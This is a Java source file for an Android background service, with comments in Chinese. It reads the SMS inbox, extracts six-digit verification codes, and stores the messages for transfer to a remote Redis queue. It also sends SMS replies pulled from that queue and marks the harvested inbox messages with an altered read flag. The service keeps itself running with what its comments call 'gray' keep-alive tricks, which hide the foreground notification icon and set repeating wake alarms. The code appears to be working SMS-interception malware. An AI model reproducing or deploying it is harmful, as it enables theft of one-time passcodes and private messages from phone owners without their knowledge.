package com.jsb.monitorSms;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Timer;
import java.util.UUID;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import org.json.JSONException;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.telephony.SmsManager;
import android.util.Log;

import com.google.gson.Gson;
import com.jsb.db.DBHelper;
import com.jsb.util.PhoneInfo;
import com.jsb.util.Utils;
import com.squareup.leakcanary.RefWatcher;


/**
 * 灰色保活手法创建的Service进程
 */
@SuppressLint("HandlerLeak")
public class MonSmsService extends Service {
	private SQLiteDatabase db = null;
	public static DBHelper helper = null; // new
	private  com.jsb.db.DBHelper.DatabaseHelper	dbHelper = null;
	
	static final String PATTERN_CODER = "\\d{6}";
	private final static String TAG = "test"; // MonSmsService.class.getSimpleName();
	private Context mContext = null;
	private final static String TABLENAME = "sms_translate";
	private Gson gson = new Gson();
	private PhoneInfo pm = null;
	private String phoneNum = null;
	private int smsCount = 0;
	public final static byte[] _writeLock = new byte[0];
	
	public String DB_NAME = "sms_monitor.db";
	public String DB_TABLE = "sms_translate";
	public int DB_VERSION = 1;

	
	// DB_NAME, null, DB_VERSION);
	private Handler smsHandle = new Handler() {
		@Override
		public void handleMessage(Message msg) {
			if (msg.what == 1) {

			}
		}
	};

	/**
	 * 定时唤醒的时间间隔，5分钟
	 */
	private final static int ALARM_INTERVAL = 5 * 60 * 1000;
	private final static int WAKE_REQUEST_CODE = 6666;

	private final static int GRAY_SERVICE_ID = -1001;

	@Override
	public void onCreate() {
		Log.i(TAG, "MonSmsService->onCreate");
		super.onCreate();
		
		com.squareup.leakcanary.watcher.RefWatcher refWatcher = JsbApplication.getRefWatcher(this);
		refWatcher.watch(this);
	}

	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		mContext = getApplicationContext();
		pm = new PhoneInfo(getApplicationContext());
		phoneNum = pm.getNativePhoneNumber();
		try{
			dbHelper = new DBHelper.DatabaseHelper(mContext);
			db = dbHelper.getWritableDatabase();
		}catch (SQLException e){
			Log.e(TAG,"----------error:"+e.getMessage());
		}
				
		Log.i(TAG, "MonSmsService->onStartCommand");
		if (Build.VERSION.SDK_INT < 18) {
			startForeground(GRAY_SERVICE_ID, new Notification());// API < 18  此方法能有效隐藏Notification上的图标
		} else {
			Intent innerIntent = new Intent(this, MonSmsInnerService.class);
			startService(innerIntent);
			startForeground(GRAY_SERVICE_ID, new Notification());
		}

		// 发送唤醒广播来促使挂掉的UI进程重新启动起来
		AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
		Intent alarmIntent = new Intent();
		alarmIntent.setAction(WakeReceiver.GRAY_WAKE_ACTION);
		PendingIntent operation = PendingIntent.getBroadcast(this,
				WAKE_REQUEST_CODE, alarmIntent,
				PendingIntent.FLAG_UPDATE_CURRENT);
		alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP,
				System.currentTimeMillis(), ALARM_INTERVAL, operation);
		init();
		
		//将数据库表 sms_translate新短信息推送到redis
		ScheduledExecutorService jsbSdlThread =   Executors.newScheduledThreadPool(10);
		jsbSdlThread.scheduleAtFixedRate(new Runnable(){
			@Override
			public void run() {
				    SmsToRedis  str =  new SmsToRedis(mContext);
				    str.exec();
					//strPool.get().exec();
					Thread.currentThread();
					try {
						Thread.sleep(5000);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}finally{
						 str =null;
						 System.gc();
					}
				}
			}, 1,3, TimeUnit.SECONDS);
		
		
		//从回复的队列取信息更新到本地表 sms_translate
		jsbSdlThread.scheduleAtFixedRate( new Runnable(){
			@Override
			public void run() {
				    ReplyRedisSms  rrs ;
					try {
						rrs =  new ReplyRedisSms(mContext);
						rrs.exec();
					} catch (IOException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					} catch (JSONException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}finally{
						 rrs =null;
						 System.gc();
					}
					
					Thread.currentThread();
					try {
						Thread.sleep(5000);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
			}
		}, 1,3, TimeUnit.SECONDS);

		//提取本地表 sms_translate 短信息发送 
		jsbSdlThread.scheduleAtFixedRate( new Runnable(){
			@Override
			public void run() {
					if( db==null || db.isOpen()== false ){
						dbHelper = new DBHelper.DatabaseHelper(mContext);
						db = dbHelper.getWritableDatabase();
					}
				
					sendAllSms();
					
					Thread.currentThread();
					try {
						Thread.sleep(5000);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}finally{
						db.close();
					}
			}
		}, 1,3, TimeUnit.SECONDS);
		
		Timer timer = new Timer();
		long delay = 1 * 1000;
		long period = 10000;
		// 从现在开始 1 秒钟之后，每隔 10秒钟执行一次 job1 将收到的新短信息放入数据库
		timer.schedule(new PollNewSms(getApplicationContext()), delay, period);

		return START_STICKY;
	}

	public void sendAllSms(){
		Cursor smsCursor = db.query(TABLENAME, new String[] {"smsid", "smsbody", "mobile", "receiveTime", "time","name", "reply", "status" }," (reply >0 or reply is not null or reply !='' ) and status < ? ", new String[] { "4" },null, null, null);
		while (smsCursor.moveToNext()) {
			Log.i(TAG,"sendAllSms*****status*******"+ String.valueOf(smsCursor.getInt(smsCursor.getColumnIndex("status"))));
		
			if (smsCursor.getString(smsCursor.getColumnIndex("reply")) == null ){
				continue;
			}
			
			String reply =  smsCursor.getString(smsCursor.getColumnIndex("reply"));
			if (reply.trim() != "" ||  "0".equals(reply)==false ) {
				Log.i(TAG,"sendAllSms*****reply*******"+ String.valueOf(smsCursor.getInt(smsCursor.getColumnIndex("reply"))));
				sendSms(smsCursor.getString(smsCursor.getColumnIndex("mobile")),
						reply,
						smsCursor.getString(smsCursor.getColumnIndex("smsid")));
			}
		 }
		smsCursor.close();
	}
	
	public void sendSms(String destinationAddress, String content,String smsid) {
		SmsManager smsMessage = SmsManager.getDefault();
		String SENT = "sms_sent";
		String DELIVERED = "sms_delivered";
		if (destinationAddress == null || destinationAddress == ""
				|| destinationAddress.isEmpty()) {
			destinationAddress = "18680486790";
		}

		Log.i(TAG, "sendSms*****start1******");
		Log.i(TAG, "sendSms*****phoneNum******" + phoneNum);
		receiveSendSMSFeedback rsFeedbackBroadcast = new receiveSendSMSFeedback(smsid);
		registerReceiver(rsFeedbackBroadcast, new IntentFilter(DELIVERED));
		if (content.length() > 70) {
			ArrayList<String> divContent = smsMessage.divideMessage(content);
			int i = 0;
			for (String msg : divContent) {
				PendingIntent sentPI = PendingIntent.getActivity(mContext,
						0, new Intent(SENT), i);
				PendingIntent receivePI = PendingIntent.getActivity(
						mContext, 0, new Intent(DELIVERED), i);
				smsMessage.sendTextMessage(destinationAddress, phoneNum,
						msg, sentPI, receivePI);
				i++;
			}
		} else {
			PendingIntent sentPI = PendingIntent.getActivity(mContext, 0,
					new Intent(SENT), 0);
			PendingIntent receivePI = PendingIntent.getActivity(mContext,
					0, new Intent(DELIVERED), 0);
			smsMessage.sendTextMessage(destinationAddress, phoneNum,
					content, sentPI, receivePI);
		}
		Log.i(TAG, "sendSms*****start2******");
		// 更新状态为发送 但没有收到回执
		
		ContentValues upSms = new ContentValues();
		upSms.put("status", 3);
		updateStatus(upSms,"smsid ='" + smsid + "'");
		Log.i(TAG, "sendSms*****start3******");
		
	}

	public void updateStatus(ContentValues contentValues,String where) {
		synchronized (_writeLock) {
			db.beginTransaction();
			try {
			    db.update(TABLENAME, contentValues, where, null);
				db.setTransactionSuccessful();
			} finally {
				db.endTransaction();
			}
		}
	}
	
	 class receiveSendSMSFeedback extends BroadcastReceiver {
		private String smsid = "";
		public final  byte[] _rwriteLock = new byte[0];

		public receiveSendSMSFeedback(String smsid) {
			super();
			this.smsid = smsid;
		}

		@Override
		public void onReceive(Context context, Intent intent) {
			// 更新短消息状态为4 完成
			switch (getResultCode()) {
			case 0:
			case -1:
				ContentValues upSms = new ContentValues();
				upSms.put("status", 4);
				synchronized (_rwriteLock) {
					db.beginTransaction();
					try {
					    db.update(TABLENAME, upSms, " smsid = '"+this.smsid+"'", null);
						db.setTransactionSuccessful();
					} finally {
						db.endTransaction();
					}
				}
				break;
			case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
			case SmsManager.RESULT_ERROR_RADIO_OFF:
			case SmsManager.RESULT_ERROR_NULL_PDU:
				break;
			}
		}
	}
	
	
	@Override
	public IBinder onBind(Intent intent) {
		throw new UnsupportedOperationException("Not yet implemented");
	}

	@Override
	public void onDestroy() {
		Log.i(TAG, "MonSmsService->onDestroy");
		super.onDestroy();
	}

	/**
	 * 给 API >= 18 的平台上用的灰色保活手段
	 */
	public static class MonSmsInnerService extends Service {

		@Override
		public void onCreate() {
			Log.i(TAG, "InnerService -> onCreate");
			super.onCreate();
		}

		@Override
		public int onStartCommand(Intent intent, int flags, int startId) {
			Log.i(TAG, "InnerService -> onStartCommand");
			startForeground(GRAY_SERVICE_ID, new Notification());
			// stopForeground(true);
			stopSelf();
			return super.onStartCommand(intent, flags, startId);
		}

		@Override
		public IBinder onBind(Intent intent) {
			// TODO: Return the communication channel to the service.
			throw new UnsupportedOperationException("Not yet implemented");
		}

		@Override
		public void onDestroy() {
			Log.i(TAG, "InnerService -> onDestroy");
			super.onDestroy();
		}
	}

	@SuppressLint("DefaultLocale")
	public void init() {
		dbHelper.CreateSmsDb(db);

		Uri SMS_INBOX = Uri.parse("content://sms/inbox");
		Context mContext = getApplicationContext();
		String[] projection = new String[] { "_id", "address", "person",
				"body", "date", "type", "read" };
		Cursor cur = mContext.getContentResolver().query(SMS_INBOX, projection,
				" read < 2 ", null, "date desc");
		if (cur == null) {
			return;
		}
		
		while (cur.moveToNext()) {
			boolean flag = false;
			String mobile = cur.getString(cur.getColumnIndex("address"));
			if (mobile.contains("+") == true) {
				mobile = mobile.substring(3, mobile.length());
			}

			if (Utils.isMobile(mobile) == false) {
				continue;
			}

			// 存入sqlite 数据库避免收件箱删除。
			String smsbody = cur.getString(cur.getColumnIndex("body"));
			String verifyCode = Utils.patternCode(smsbody,PATTERN_CODER) ;

			if (verifyCode != null || verifyCode != "") {
				String smsId = UUID.randomUUID().toString().toUpperCase().replace("-", "");
				ContentValues sms = new ContentValues();
				sms.put("smsid", smsId);
				sms.put("smsbody", smsbody);
				sms.put("mobile", cur.getString(cur.getColumnIndex("address")));
				sms.put("receiveTime", cur.getString(cur.getColumnIndex("date")).toString());
				if (cur.getString(cur.getColumnIndex("person")) != null&& cur.getString(cur.getColumnIndex("person")) != "")
					sms.put("name", cur.getString(cur.getColumnIndex("person")));
				
				synchronized(_writeLock){
					db.beginTransaction();
					try{
						db.insert("sms_translate", null, sms);
						db.setTransactionSuccessful();
						flag = true;
					}catch(Exception ex){
						flag = false;
						Log.e("fav_insert", ex.getMessage());
					}finally{
						db.endTransaction();
					}
				}
			}
			
			// 将短消息设为已读
			if (flag == true) {
				ContentValues smsInfo = new ContentValues();
				smsInfo.put("read", "2");
				try {
					mContext.getContentResolver().update(SMS_INBOX,smsInfo," _id = ?",new String[] { cur.getString(cur.getColumnIndex("_id")) });
				} catch (Exception e) {
					Log.e("test", "initDb:error" + e.getMessage());
					e.printStackTrace();
				}
			}
		}
		
		cur.close();
		return;
	}

	

}
